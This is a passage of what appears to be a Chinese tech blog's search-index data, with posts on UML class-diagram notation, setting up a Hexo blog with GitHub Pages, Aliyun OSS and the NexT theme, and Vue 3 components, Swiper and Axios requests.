测试\n     功能测试:active, a1, after des3, 3d\n     压力测试 :after a1  , 20h\n     测试报告 : 48h\n   ```\n\n   \n","tags":["Markdown"],"categories":["博客搭建"]},{"title":"UML类图与接口图的表示","url":"/20250619/c9ac90bb.html","content":"\n# 类图\n\n![image-20221027182132103](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027182132103.png) \n\n\n\n```\n①访问修饰符\n\n\t+ ：public\n\t-： private\n\t# : protected（friendly也归入这类）\n\n② + a : int = defaultValue解读\n\n\ta：成员变量名\n\tint： 变量名的类型\n\tdefaultValue： 为a的默认值\n\n③ + operation1(int params):returnType解读\n\toperation1： 方法名\n\tparams： 方法参数名\n\treternType： 返回值类型\n```\n\n# 抽象类图\n\n注意，名称为斜体\n\n![image-20221027182148176](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027182148176.png)  \n\n# 接口图\n\n![image-20221027182201862](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027182201862.png)  \n\n# 类之间的关系\n\n## 泛化（继承）关系\n\n![image-20221027182221807](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027182221807.png)   \n\n## 实现关系\n\n![image-20221027182231520](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027182231520.png)   \n\n## 关联关系\n\n### 单关联关系\n\n![在这里插入图片描述](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200908213344266.png)  \n\n### 双向关联关系\n\n![在这里插入图片描述](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200908213410395.png)  \n\n### 自关联\n\n![image-20221027182248199](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027182248199.png)   \n\n### 聚合关系\n\n![在这里插入图片描述](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200908213520120.png)  \n\n## 组合关系\n\n![在这里插入图片描述](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200908213538273.png)  \n\n \n","tags":["UML类图"],"categories":["博客搭建"]},{"title":"Hexo 搭建博客","url":"/20250619/b6159bfb.html","content":"\n# 一、Hexo 安装和配置\n\n## Hexo安装前准备\n\n> 在使用hexo命令时，请使用windows自带的命令行，管理员运行\n\n1. 安装前提（Hexo是基于Node.js的服务，因此首先需要下载[Node.js](https://nodejs.org/zh-cn), 以及[Git](https://git-scm.com/)，再安装[Hexo](https://link.zhihu.com/?target=https%3A//hexo.io/zh-cn/docs/)）\n\n   ```bash\n   C:\\Users\\Administrator>git --version\n   C:\\Users\\Administrator>node --version\n   C:\\Users\\Administrator>hexo -v\n   ```\n   \n2. 安装使用hexo-cil\n\n   ```bash\n   npm install -g hexo-cli\n   ```\n\n3. 安装 SCSS 渲染器\n\n   ```bash\n   # 删除旧版渲染器（如有）\n   npm uninstall hexo-renderer-node-sass hexo-renderer-sass hexo-renderer-dartsass\n   \n   # 安装 Dart Sass 渲染器（推荐）\n   npm install hexo-renderer-dartsass --save\n   \n   # 更新其他依赖\n   npm update\n   ```\n\n   \n\n## Hexo初始化博客\n\n1. 初始化：安装完毕hexo，此时可以选择一个空文件夹建立博客站点框架。执行下面命令，Hexo 将会在指定文件夹中新建所需要的文件。\n\n   ```sh\n   $ hexo init <folder>\n   $ cd <folder>\n   $ npm install\n   ```\n   \n   执行后Hexo将会在`<folder>`文件夹建立站点文件。若 `<folder>`为空，将在当前文件夹建立站点\n\n   此时，指定文件夹将会出现如下文件目录\n\n   ```sh\n   .\n   ├── _config.yml\n   ├── package.json\n   ├── scaffolds\n   ├── source\n   |   ├── _drafts\n   |   └── _posts\n   └── themes\n   ```\n   \n   其中，有几个文件极为重要：\n\n   - `_config.yml` 该文件为网站配置信息，包括网站标题、作者、时间、语言、主题等重要配置和功能。\n   - `source/_posts/*.md`\n     `source` 文件夹为博文的资源文件夹，其中的`_posts`文件夹储存了`markdown`文件为网站博文。\n   - `themes` 文件夹储存了第三方主题。\n   \n2. 测试初始化结果\n\n   建立博文\n\n   ```text\n   $ hexo new \"welcome\"\n   ```\n\n   此时 `/source/_posts` 文件夹中建立了 `welcome.md` 文件。接着运行\n\n   ```text\n   $ hexo server\n   ```\n\n   此时命令行提示\n\n   ```sh\n   INFO  Validating config\n   INFO  Start processing\n   INFO  Hexo is running at http://localhost:4000/ . Press Ctrl+C to stop.\n   ```\n\n   说明网站已成功在本地部署（ `http://localhost:4000/`），可在命令行执行Crtl+C 停止网站运行。\n\n\n## GithubPage部署\n\n1. 关联GithubPage账号\n\n   > - 在github账号下建立名为 `<github 用户名>.github.io`的仓库（这将是之后的访问网址），可以使用readme.md进行初始化。\n   > - 设置ssh登录。在命令行中输入`$ ssh-keygen -t rsa -C \"GitHub注册邮箱\"`直接三个回车，不需要密码。这时在 `C:/Users/<用户名>/.ssh` 文件夹下会建立公钥 `id_rsa.pub` 文件，将其中内容全部复制。打开`Github Settings keys`页面，点击`new SSH key`，填写任意 `title` 和刚才复制的公钥信息，并`Add SSH key`，\n   > - 此时打开Git Bash，输入`ssh git@github.com`，会出现`You've successfully authenticated, but GitHub does not provide shell access.`\n\n2. 进入博客文件夹，在 `_config.yml` 文件中修改`deploy`块的信息\n\n   ```yml\n   deploy:\n     type: git\n     repo: git@github.com:hmxyl/hmxyl.github.io.git\n     branch: main\n   ```\n\n3. 在博客文件夹下打开命令行，安装部署到github.io的依赖\n\n   ```sh\n   $ npm install hexo-deployer-git --save\n   ```\n\n## Hexo发布\n\n1. 本地运行：在端口`4000`\n\n   ```sh\n   $ hexo clean && hexo s\n   INFO  Validating config\n   INFO  Start processing\n   INFO  Hexo is running at http://localhost:4000/ . Press Ctrl+C to stop.\n   ```\n\n2. 部署整个博客到GitHub\n\n   ```sh\n   $ hexo clean\n   $ hexo generate\n   $ hexo deploy\n   ```\n\n   或者合并命令\n\n   ```sh\n   $  hexo clean && hexo generate && hexo deploy\n   ```\n   \n   此时主目录下出现`.deploy_git`文件夹，该文件夹与github仓库中的文件一致，为页面文件。此时访问 `Github用户名.github.io` 即可打开博客网页。\n   \n   每次部署完，Github通常需要几分钟更新网站，此时多刷新几次网站即可\n   \n\n\n\n\n#  二、阿里云OSS开通及配置\n\n参考：[阿里云OSS+PicGo-Core搭建图床，配合Typora、Obsidian使用](https://www.cnblogs.com/NFTO21/p/16285829.html)\n\n 登录[阿里云](https://www.aliyun.com/)官网，开通**对象存储OSS**。 根据需要[按需购买](https://common-buy.aliyun.com/?spm=5176.7933691.J_5253785160.2.6a834c59JnWmz4&commodityCode=ossbag#/buy)对应的资源包即可：（搭建个人图床，购买 40G容量5年（45元）+ 5年 的 100万接口上传次数/年（5元） ）基础配置\n\n##  创建 Bucket\n\n 打开[OSS管理控制台Bucket页面](https://oss.console.aliyun.com/bucket)，按需创建一个Bucket。\n![image-20220516152551602](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130538-1554992822-1749625539082-1.png)\n\n 创建Bucket成功\n\n![image-20220516154556221](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130203-786734777-1749625544741-4.png)\n\n 进入新建的Bucket，在文件管理->上传文件中即可开始上传文件，\n\n![image-20220516155157249](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130324-816099928-1749625562745-7.png)\n\n\n\n![image-20220516155507591](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130545-1477425769-1749625566888-10.png)\n\n 点击详情，即可看到上传图片的URL，复制URL到浏览器中访问图片。\n\n![image-20220516160202041](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130375-920098593-1749625571175-13.png)\n\n##  配置 AccessKey\n\n**1. 创建子用户和AccessKey**\n\n 鼠标移动到头像上即可看到**AccessKey管理**，打开管理页面，\n\n![image-20220516171100691](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130218-1943488233-1749625575355-16.png) \n\n **推荐使用子账户创建的AccessKey**（[RAM 访问控制 ](https://ram.console.aliyun.com/users)中创建子账户）\n![image-20220516171247987](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130421-634915099-1749625579893-19.png)\n\n\n\n![image-20220516172210041](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130422-386866137-1749625590431-25.png)\n\n 选中刚才创建的子用户，即可创建**AccessKey**并获取**AccessKey Secret**。\n\n> **AccessKey Secret只能查看一次，建议复制到自己本地存储，后面PicGo-Core配置需要使用到**\n\n![image-20220516172517201](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130493-1428718749-1749625585518-22.png)\n\n**Bucket授权子用户权限** ：进入权限管理页面，\n\n![image-20220516173811851](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130396-775910505-1749625597736-31.png)\n\n 配置子用户权限，按需勾选即可，\n\n![image-20220516174245990](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130449-866487166-1749625594537-28.png) \n\n **至此，图床所需的所有配置已弄完**\n\n# 三、[PicGo](https://picgo.github.io/PicGo-Doc/) 安装及图床配置\n\n1. 安装：参考[PicGo安装](https://picgo.github.io/PicGo-Doc/)\n\n2. 配置图床\n\n   | 参数           | 说明                                                         |\n   | -------------- | ------------------------------------------------------------ |\n   | 设定keyId      | 创建RAM用户时的 AccessKey ID                                 |\n   | 设定KeySecret  | 创建RAM用户时的 AccessKey Secret                             |\n   | 设定储存空间名 | 新建的Bucket名称                                             |\n   | 确定存储区域   | 创建的Bucket详情中查看：`地域节点`  中的二级域名 `oss-cn-城市` |\n\n3. 测试上传一张图片\n\n\n\n# 四、Typora 中 上传图片配置\n\n配置： 文件-> 偏好设置->图像\n\n![image-20221027172837218](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027172837218-1749626769471-34-1749626851549-37.png) \n\n\n\n# 五、插件\n\n## 永久唯一链接：hexo-abbrlink\n\n> Hexo根目录下`_config.yml`原有的链接地址生成方式 `permalink: :year/:month/:day/:title/`, 其中title为 `front-matter`内的title，而非文件的名称。\n>\n> ![front-matter内的title](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230317150229481-1679222650307-8.png) \n\n1. 安装abbrlink插件\n\n   `npm install hexo-abbrlink --save `\n\n   安装后，**hexo** **会自动（保存文章时、或者hexo g时都可以）**在front-matter中自动加入`abbrlink`字段。\n\n   `abbrlink`一旦生成，即使修改title，其内容也不会再更改了，除非将`abbrlink`字段手动删除，然后hexo会重新根据title自动生成\n\n   ![image-20230317150430466](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230317150430466-1679222650306-6.png)  \n\n2. _**`config.yml`** 中修改 `permalink` 并定义 `abbrlink` \n\n   ```xml\n   # permalink: :year/:month/:day/:title/\n   \n   permalink: :year:month:day/:abbrlink.html     # 将原来文章的地址修改为这个，并添加如下abbrlink\n   abbrlink:\n     alg: crc32      #support crc16(default) and crc32\n     rep: hex        #support dec(default) and hex\n     drafts: false   #(true)Process draft,(false)Do not process draft. false(default) \n     # Generate categories from directory-tree\n     # depth: the max_depth of directory-tree you want to generate, should > 0\n     auto_category:\n        enable: true  #true(default)\n        depth:        #3(default)\n        over_write: false \n     auto_title: false #enable auto title, it can auto fill the title by path\n     auto_date: true #enable auto date, it can auto fill the date by time today\n     force: false #enable force mode,in this mode, the plugin will ignore the cache, and calc the abbrlink for every post even it already had abbrlink. This only updates abbrlink rather than other front variables.\n   \n   ```\n\n\n# 六、修改Hexo主题\n\n## 配置新文件模板\n\n路径：根目录下`scaffolds->post.md`。使用`hexo new post [title]`创建文章的时候，应注意把标题里的空格换为`-`\n\n```yml\n---\ntitle: {{ title }}\ndate: {{ date }}\ntags:\ncategories: \n  - [未分类] \nsummary: \"\"\n---\n```\n\n\n\n| 参数              | 描述                                                         | 默认值                                                       |\n| :---------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |\n| `layout`          | 布局                                                         | [`config.default_layout`](https://hexo.io/zh-cn/docs/configuration#文章) |\n| `title`           | 标题                                                         | 文章的文件名                                                 |\n| `date`            | 建立日期                                                     | 文件建立日期                                                 |\n| `updated`         | 更新日期                                                     | 文件更新日期                                                 |\n| `comments`        | 开启文章的评论功能                                           | true                                                         |\n| `tags`            | 标签（不适用于分页）                                         |                                                              |\n| `categories`      | 分类（不适用于分页）                                         |                                                              |\n| `permalink`       | 覆盖文章网址                                                 |                                                              |\n| `excerpt`         | Page excerpt in plain text. Use [this plugin](https://hexo.io/docs/tag-plugins#Post-Excerpt) to format the text |                                                              |\n| `disableNunjucks` | Disable rendering of Nunjucks tag `{{ }}`/`{% %}` and [tag plugins](https://hexo.io/docs/tag-plugins) when enabled |                                                              |\n| `lang`            | Set the language to override [auto-detection](https://hexo.io/docs/internationalization#Path) | Inherited from `_config.yml`                                 |\n\n\n\n##  landscape（默认）\n\n- GIT地址\n\n```sh\n# landscape（默认）\ngit clone https://github.com/hexojs/hexo-theme-landscape.git  themes/landscape\n```\n\n- 启用主题\n\n修改`_config.yml`\n\n```sh\ntheme: landscape\n```\n\n\n\n# 七、Hexo主题：NexT（当前）\n\n[初始化配置NexT](https://theme-next.iissnan.com/getting-started.html)\n\n## GIT地址\n\n```bash\n# next\ngit clone https://github.com/theme-next/hexo-theme-next themes/next\n```\n\n## 启用主题\n\n修改`_config.yml`\n\n```sh\ntheme: next\n```\n\n## 选择 Scheme\n\n```stylus\nscheme: Pisces\n```\n\n- Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白\n- Mist - Muse 的紧凑版本，整洁有序的单栏外观\n- Pisces - 双栏 Scheme\n\n\n\n\n\n## 设置菜单：`menu`\n\n1. **主题配置文件** 设定菜单内容：\n\n   ```stylus\n   menu:\n     home: / || fa fa-home\n     friendlink: /friendlink/ || fa fa-briefcase\n     #about: /about/ || fa fa-user\n     tags: /tags/ || fa fa-tags\n     categories: /categories/ || fa fa-th\n     archives: /archives/ || fa fa-archive\n     #schedule: /schedule/ || fa fa-calendar\n     #sitemap: /sitemap.xml || fa fa-sitemap\n     #commonweal: /404/ || fa fa-heartbeat\n   ```\n\n   NexT 默认的菜单\n\n   | 键值       | 设定值                    | 显示文本（简体中文） |              |\n   | :--------- | :------------------------ | :------------------- | ------------ |\n   | home       | `home: /`                 | 主页                 |              |\n   | archives   | `archives: /archives`     | 归档页               |              |\n   | categories | `categories: /categories` | 分类页               | 需要手动创建 |\n   | tags       | `tags: /tags`             | 标签页               | 需要手动创建 |\n   | about      | `about: /about`           | 关于页面             | 需要手动创建 |\n   | commonweal | `commonweal: /404.html`   | 公益 404             | 需要手动创建 |\n\n   菜单配置包括三个部分，第一是菜单项（名称和链接），第二是菜单项的显示文本，第三是菜单项对应的图标。 \n\n   NexT 使用的是 [Font Awesome](http://fontawesome.io/) 提供的图标。若你的站点运行在子目录中，请将链接前缀的 `/` 去掉。\n\n   \n\n2. 设置菜单项的显示文本\n\n   在第一步中设置的菜单的名称并不直接用于界面上的展示。Hexo 在生成的时候将使用 这个名称查找对应的语言翻译，并提取显示文本。这些翻译文本放置在 NexT 主题目录下的 `languages/{language}.yml` （`{language}` 为你所使用的语言）。\n\n    以简体中文为例，若你需要添加一个菜单项，比如 `something`。那么就需要修改简体中文对应的翻译文件 `languages/zh-CN.yml`，在 `menu` 字段下添加一项：\n\n   ```\n   menu:\n     home: 首页\n     archives: 归档\n     categories: 分类\n     tags: 标签\n     about: 关于\n     search: 搜索\n     commonweal: 公益404\n     something: 有料\n   ```\n\n3. 设定菜单项的图标开关：`menu_icons`\n\n   图标配置在“||” 之后。可从主题文件夹`source\\lib\\font-awesome\\css\\all.min.css`中搜索到需要的图标\n\n   ```yaml\n   # 菜单图标配置示例\n   menu_icons:\n     enable: true\n     # 將值badge設置為true可以在主題配置文件的menu_settings部分的菜單項中顯示帖子/類別/標籤的計數\n     badges: false\n   ```\n\n   \n\n\n## 配置分类：`categories`\n\n1. **主题配置文件**放开 **tags: /tags/ || fa fa-tags** 这行代码就已经配置好里分类。\n\n2. 创建分类目录文件\n\n   ```sh\n   $ hexo new page categories\n   ```\n\n3. 编辑页面让主题识别页面为分类页面\n\n   上文说到需要编辑页面才能让主题识别这个页面为分类页面，我们只需要根据成功后到提示路径打开`index.md`这个页面文件，打开后默认内容是\n\n   ```\n   ---\n   title: 文章分类\n   date: 2021-01-25 22:37:25\n   ---\n   ```\n\n   我们需要添加上`type: \"categories\"`这段代码就能让主题识别该页面为分类页面了\n\n   ```\n   ---\n   title: 文章分类\n   date: 2021-01-25 22:37:25\n   type: \"categories\"\n   ---\n   ```\n\n   我们就完成了整个分类页面的配置了\n\n4. 给文章设置分类属性\n\n   首先打开需要添加分类的文章，在文章里添加上以下文案就设置好分类了\n\n   ```\n   ---\n   categories: \n   - Android\n   ---\n   ```\n\n   如上`categories:Android`表示添加这边文章到 “**Android**” 这个分类下。\n   然后我们就可以在博客到分类里看到该分类了。\n\n   ```\n   //设置二级分类\n   ---\n   categories: \n   - Android\n   - xxx\n   ---\n   ```\n\n   如上设置二级分类则该篇文章为 Android 分类下的 XXX 分类下。\n\n\n\n\n\n## 配置标签：`tags`\n\n1. **主题配置文件**放开 **tags: /tags/ || fa fa-tags** 这行代码就已经配置好里分类。\n\n2. 创建标签目录文件\n\n   ```sh\n   $ hexo new page tags\n   ```\n\n3. 编辑页面让主题识别页面为标签页面\n\n   上文说到需要编辑页面才能让主题识别这个页面为标签页面，我们只需要根据成功后到提示路径打开`index.md`这个页面文件，添加上`type: \"tags\"`这段代码就能让主题识别该页面为标签页面了\n\n   ```stylus\n   ---\n   title: 标签\n   date: 2021-01-25 22:54:58\n   type: \"tags\"\n   ---\n   ```\n\n   \n\n4. 给文章设置标签属性\n\n   ```markdown\n   //设置单标签\n   ---\n   tags:\n   - Facebook配置\n   ---\n   \n   //设置多标签 并同时设置分类\n   ---\n   categories: \n   - Android\n   tags:\n   - Android\n   - RecyclerView\n   ---\n   ```\n\n   如上`tags:- Facebook配置`表示给这篇文章添加 “**Facebook配置**” 这个分标签。\n   然后我们就可以在博客到标签里看到该标签了。\n\n\n\n## 设置侧栏：`sidebar`\n\n默认情况下，侧栏仅在文章页面（拥有目录列表）时才显示，并放置于右侧位置。 可以通过修改 **主题配置文件** 中的 `sidebar` 字段来控制侧栏的行为。侧栏的设置包括两个部分，其一是侧栏的位置， 其二是侧栏显示的时机。\n\n1. 设置侧栏的位置，修改 `sidebar.position` 的值，支持的选项有：\n\n   - left - 靠左放置\n   - right - 靠右放置\n\n   目前仅 Pisces Scheme 支持 `position` 配置。影响版本**5.0.0**及更低版本。\n\n   ```yaml\n   sidebar:\n     position: left\n   ```\n\n2. 设置侧栏显示的时机，修改 `sidebar.display` 的值，支持的选项有：\n\n   - `post` - 默认行为，在文章页面（拥有目录列表）时显示\n   - `always` - 在所有页面中都显示\n   - `hide` - 在所有页面中都隐藏（可以手动展开）\n   - `remove` - 完全移除\n\n   ```yaml\n   sidebar:\n     display: post\n   ```\n\n   已知侧栏在 `use motion: false` 的情况下不会展示。 影响版本**5.0.0**及更低版本。\n\n## 设置头像：`avatar`\n\n编辑 **主题配置文件**， 修改字段`avatar` ， 值设置成头像的链接地址。其中，头像的链接地址可以是：\n\n| 地址             | 值                                                           |\n| :--------------- | :----------------------------------------------------------- |\n| 完整的互联网 URI | `http://example.com/avatar.png`                              |\n| 站点内的地址     | 将头像放置主题目录下的 `source/uploads/` （新建 uploads 目录若不存在） 配置为：`avatar: /uploads/avatar.png`或者 放置在 `source/images/` 目录下 配置为：`avatar: /images/avatar.png` |\n\n头像设置示例\n\n```sh\navatar: http://example.com/avatar.png\n```\n\n\n\n## 首页只显示部分摘要（不显示全文）\n\nNext默认是会显示全文的，这样显然很不方便，因此需要一些方法去只显示前面一部分。\n\n1. 修改配置\n\n   首先需要在Next主题的_config.yml中把设置打开：(默认安装时就打开了)\n\n   ```sh\n   # Automatically excerpt description in homepage as preamble text.\n   excerpt_summary: true\n   ```\n\n2. 之后有两种方法\n\n   - 方法一：写概述\n\n     在文章的`front-matter`中添加`description`，其中description中的内容就会被显示在首页上，其余一律不显示。\n\n     ```\n     ---\n     title: 让首页显示部分内容\n     date: 2020-02-23 22:55:10\n     summary: 这是显示在首页的概述，正文内容均会被隐藏。\n     ---\n     ```\n\n\n   - 方法二：文章截断\n\n     在需要截断的地方加入：\n\n     ```\n     <!--more-->\n     ```\n\n     首页就会显示这条以上的所有内容，隐藏接下来的所有内容。\n     例如本文会显示到`修改配置`上面。\n\n     这个明显就方便很多，但当然有利有弊，比如开头都是废话首页看着就不是很好看，因此我一般会先选择方法二，如果感觉文章前面的写的不太好再用方法一。\n\n\n## 修改字体\n\n 修改`themes\\next\\source\\css\\_variables\\base.styl` 文件\n\n# 八、问题记录\n\n- 运行Hexo报错hexo : 无法加载文件hexo.ps1，因为在此系统上禁止运行脚本\n\n  > 解决方案: https://blog.csdn.net/qq_42951560/article/details/123678786\n  >\n  > 设置->隐私和安全性->开发者选项->允许本地PowerShell脚本在为签名的情况下运行\n  >\n  > ![image-20250107165708684](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20250107165708684-1736843180040-13.png) \n","tags":["Hexo"],"categories":["博客搭建"]},{"title":"组件","url":"/20250619/34778b46.html","content":"\n## 组件基础\n\n### 单文件组件\n\nVue 单文件组件（又名 `*.vue` 文件，缩写为 **SFC**）是一种特殊的文件格式，它允许将 Vue 组件的模板、逻辑 **与** 样式封装在单个文件中\n\n```vue\n<template>\n    <h3>单文件组件</h3>\n</template>\n\n<script>\nexport default {\n    name:\"MyComponent\"\n}\n</script>\n\n<style scoped>\nh3{\n    color: red;\n}\n</style>\n```\n\n##  模板引用（`ref`）\n\nhttps://cn.vuejs.org/guide/essentials/template-refs.html\n\n虽然 Vue 的声明性渲染模型为你抽象了大部分对 DOM 的直接操作，但在某些情况下，我们仍然需要直接访问底层 DOM 元素。要实现这一点，我们可以使用特殊的 `ref` attribute：\n\n`ref` 是一个特殊的 attribute， 它允许我们在一个特定的 DOM 元素或子组件实例被挂载后，获得对它的直接引用。\n\n这可能很有用，比如说在组件挂载时将焦点设置到一个 input 元素上，或在一个元素上初始化一个第三方库。\n\n\n\n### 访问模板引用\n\n挂载结束后引用都会被暴露在 `this.$refs` 之上：\n\n```vue\n<script>\nexport default {\n  mounted() {\n    this.$refs.input.focus()\n  }\n}\n</script>\n\n<template>\n  <input ref=\"input\" />\n</template>\n```\n\n注意，你只可以**在组件挂载后**才能访问模板引用。如果你想在模板中的表达式上访问 `$refs.input`，在初次渲染时会是 `null`。这是因为在初次渲染前这个元素还不存在\n\n### [`v-for` 中的模板引用](https://cn.vuejs.org/guide/essentials/template-refs.html#refs-inside-v-for)\n\n> 需要 v3.2.25 及以上版本\n\n当在 `v-for` 中使用模板引用时，相应的引用中包含的值是一个数组：\n\n```vue\n<script>\nexport default {\n  data() {\n    return {\n      list: [\n        /* ... */\n      ]\n    }\n  },\n  mounted() {\n    console.log(this.$refs.items)\n  }\n}\n</script>\n\n<template>\n  <ul>\n    <li v-for=\"item in list\" ref=\"items\">\n      {{ item }}\n    </li>\n  </ul>\n</template>\n```\n\n> 应该注意的是，ref 数组**并不**保证与源数组相同的顺序。\n\n### [函数模板引用](https://cn.vuejs.org/guide/essentials/template-refs.html#function-refs)\n\n除了使用字符串值作名字，`ref` attribute 还可以绑定为一个函数，会在每次组件更新时都被调用。该函数会收到元素引用作为其第一个参数：\n\n```html\n<input :ref=\"(el) => { /* 将 el 赋值给一个数据属性或 ref 变量 */ }\">\n```\n\n注意我们这里需要使用动态的 `:ref` 绑定才能够传入一个函数。当绑定的元素被卸载时，函数也会被调用一次，此时的 `el` 参数会是 `null`。你当然也可以绑定一个组件方法而不是内联函数。\n\n### 组件上的 ref\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## 组件基础\n\n\n\n### 加载组件\n\n第一步：引入组件 `import MyComponentVue from './components/MyComponent.vue'`\n\n第二步：挂载组件 `components: { MyComponentVue }`\n\n第三步：显示组件 `<my-componentVue />`\n\n\n\n### 组件的嵌套关系\n\n通常一个应用会以一棵嵌套的组件树的形式来组织\n\n![image-20231210205035429](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20231210205035429.png) \n\n## Props组件交互\n\n\n\n组件与组件之间是需要存在交互的，否则完全没关系，组件的意义就很小了\n\n`Prop` 是你可以在组件上注册的一些自定义 attribute\n\n```vue\n<my-componentVue title=\"标题\"/>\n```\n\n```vue\n<template>\n    <h3>单文件组件</h3>\n    <p>{{ title }}</p>\n</template>\n\n<script>\nexport default {\n    name:\"MyComponent\",\n    props:{\n        title:{\n            type:String,\n            default:\"\"\n        }\n    }\n}\n</script>\n```\n\n\n\n### Prop 类型\n\nProp传递参数其实是没有类型限制的\n\n```vue\nprops: {\n  title: String,\n  likes: Number,\n  isPublished: Boolean,\n  commentIds: Array,\n  author: Object,\n  callback: Function\n}\n```\n\n> **温馨提示**\n>\n> 数据类型为数组或者对象的时候，默认值是需要返回工厂模式\n\n\n\n\n\n\n\n\n\n\n\n\n\n## 自定义事件组件交互\n\n\n\n\n\n\n\n自定义事件可以在组件中反向传递数据，`prop` 可以将数据从父组件传递到子组件，那么反向如何操作呢，就可以利用自定义事件实现 `$emit`\n\n```vue\n<template>\n    <h3>单文件组件</h3>\n    <button @click=\"sendHandle\">发送数据</button>\n</template>\n\n<script>\nexport default {\n    name: \"MyComponent\",\n    methods:{\n        sendHandle(){\n            this.$emit(\"onCustom\",\"数据\")\n        }\n    }\n}\n</script>\n\n<style scoped>\nh3 {\n    color: red;\n}\n</style>\n```\n\n```vue\n<template>\n  <my-componentVue @onCustom=\"getData\" />\n</template>\n\n<script>\n\nimport MyComponentVue from './components/MyComponent.vue'\n\nexport default {\n  name: 'App',\n  components: {\n    MyComponentVue\n  },\n  methods: {\n    getData(data) {\n      console.log(data);\n    }\n  }\n}\n</script>\n```\n\n\n\n\n\n\n\n","tags":["Vue3"],"categories":["前端","Vue3"]},{"title":"其他","url":"/20250619/6e23c48.html","content":"\n\n## 组件生命周期\n\n\n\n\n\n\n\n每个组件在被创建时都要经过一系列的初始化过程——例如，需要设置数据监听、编译模板、将实例挂载到 DOM 并在数据变化时更新 DOM 等。同时在这个过程中也会运行一些叫做**生命周期钩子**的函数，这给了用户在不同阶段添加自己的代码的机会\n\n\n\n\n\n\n\n为了方便记忆，我们可以将他们分类：\n\n创建时：`beforeCreate`、`created`\n\n渲染时：`beforeMount`、`mounted`\n\n更新时：`beforeUpdate`、`updated`\n\n卸载时：`beforeUnmount`、`unmounted`\n\n\n\n\n\n\n\n\n\n\n\n## Vue引入第三方\n\n\n\n\n\n\n\n`Swiper` 开源、免费、强大的触摸滑动插件\n\n`Swiper` 是纯javascript打造的滑动特效插件，面向手机、平板电脑等移动终端\n\n`Swiper` 能实现触屏焦点图、触屏Tab切换、触屏轮播图切换等常用效果\n\n\n\n>**温馨提示**\n>\n>官方文档：https://swiperjs.com/vue\n>\n>安装指定版本: `npm instal --save swiper@8.1.6`\n\n\n\n### 基础实现\n\n```vue\n<template>\n  <div class=\"hello\">\n    <swiper class=\"mySwiper\">\n      <swiper-slide>Slide 1</swiper-slide>\n      <swiper-slide>Slide 2</swiper-slide>\n      <swiper-slide>Slide 3</swiper-slide>\n    </swiper>\n  </div>\n</template>\n\n<script>\nimport { Swiper, SwiperSlide } from 'swiper/vue';\nimport 'swiper/css';\n\nexport default {\n  name: 'HelloWorld',\n  components: {\n    Swiper,\n    SwiperSlide,\n  }\n}\n</script>\n```\n\n\n\n### 添加指示器\n\n```vue\n<template>\n  <div class=\"hello\">\n    <swiper class=\"mySwiper\" :modules=\"modules\" :pagination=\"{ clickable: true }\">\n      <swiper-slide>\n        <img src=\"../assets/logo.png\" alt=\"\">\n      </swiper-slide>\n      <swiper-slide>\n        <img src=\"../assets/logo.png\" alt=\"\">\n      </swiper-slide>\n      <swiper-slide>\n        <img src=\"../assets/logo.png\" alt=\"\">\n      </swiper-slide>\n    </swiper>\n  </div>\n</template>\n\n<script>\nimport { Pagination } from 'swiper';\nimport { Swiper, SwiperSlide } from 'swiper/vue';\nimport 'swiper/css';\nimport 'swiper/css/pagination';\n\nexport default {\n  name: 'HelloWorld',\n  data(){\n    return{\n      modules: [ Pagination ]\n    }\n  },\n  components: {\n    Swiper,\n    SwiperSlide,\n  }\n}\n</script>\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Axios网络请求\n\n\n\n\n\n\n\nAxios 是一个基于 promise 的网络请求库\n\n\n\n### 安装\n\nAxios的应用是需要单独安装的 `npm install --save axios`\n\n\n\n### 引入\n\n组件中引入: `import axios from \"axios\"`\n\n全局引用: \n\n```js\nimport axios from \"axios\"\n\nconst app = createApp(App);\napp.config.globalProperties.$axios = axios\napp.mount('#app')\n\n// 在组件中调用\nthis.$axios\n```\n\n\n\n### 网络请求基本示例\n\n#### get请求\n\n```js\naxios({\n    method: \"get\",\n    url: \"http://iwenwiki.com/api/blueberrypai/getChengpinDetails.php\"\n}).then(res => {\n    console.log(res.data);\n})\n```\n\n\n\n#### post请求\n\n> **温馨提示**\n>\n> post请求参数是需要额外处理的\n>\n> 1. 安装依赖: `npm install --save querystring`\n> 2. 转换参数格式: `qs.stringify({})`\n\n```js\naxios({\n    method:\"post\",\n    url:\"http://iwenwiki.com/api/blueberrypai/login.php\",\n    data:qs.stringify({\n        user_id:\"iwen@qq.com\",\n        password:\"iwen123\",\n        verification_code:\"crfvw\"\n    